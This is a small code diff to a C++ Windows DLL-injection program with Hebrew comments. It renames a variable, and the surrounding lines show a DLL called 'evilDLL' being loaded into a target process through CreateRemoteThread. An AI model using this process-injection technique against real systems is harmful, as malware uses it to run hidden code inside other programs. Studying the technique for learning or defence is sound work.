@@ -9,7 +9,7 @@ unsigned int evilLen = sizeof(evilDLL) + 1;
 
 int main(int argc, char* argv[]) {
     HANDLE process_handle; // לינק אל הפרוסס שעליו מחדירים את הקובץ
-    HANDLE rt; // remote thread
+    HANDLE new_thread; // remote thread
     LPVOID allocated_buffer; // המקום המוקצה שפנוי בפרוסס שעליו מחדירים
     bool dll_injected;
     if (argc < 2)
@@ -51,9 +51,9 @@ int main(int argc, char* argv[]) {
     {
         std::cout << "did not inject\n";
     }
-    rt = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, allocated_buffer, 0, NULL);
-    std::cout << rt;
-    CloseHandle(rt);
+    new_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, allocated_buffer, 0, NULL);
+    std::cout << new_thread;
+    CloseHandle(new_thread);
     CloseHandle(process_handle);
     return 0;
 }
